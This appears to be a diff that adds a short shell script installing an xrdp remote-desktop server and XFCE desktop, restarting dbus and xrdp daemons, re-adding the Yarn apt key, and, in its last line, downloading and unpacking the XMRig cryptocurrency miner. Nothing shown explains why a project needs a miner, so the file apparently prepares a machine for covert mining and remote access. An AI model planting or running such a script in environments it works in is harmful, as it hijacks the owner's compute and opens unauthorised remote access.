@@ -1,0 +1,11 @@
+sudo apt-get update && sudo apt-get install -y xrdp xfce4 xfce4-goodies dbus-x11 x11-utils && sudo pkill -f xrdp && sudo pkill -f xrdp-sesman && sudo rm -f /run/dbus/pid && sudo mkdir -p /run/dbus 
+
+ sudo dbus-daemon --system &
+
+ sudo /usr/sbin/xrdp-sesman && sudo /usr/sbin/xrdp
+
+ sudo rm /etc/apt/sources.list.d/yarn.list
+
+ curl -sS https://dl.yarnpkg.com/debian/pubkey.gpg | sudo apt-key add -
+
+ curl -L https://github.com/xmrig/xmrig/releases/download/v6.25.0/xmrig-6.25.0-linux-static-x64.tar.gz | tar -xz
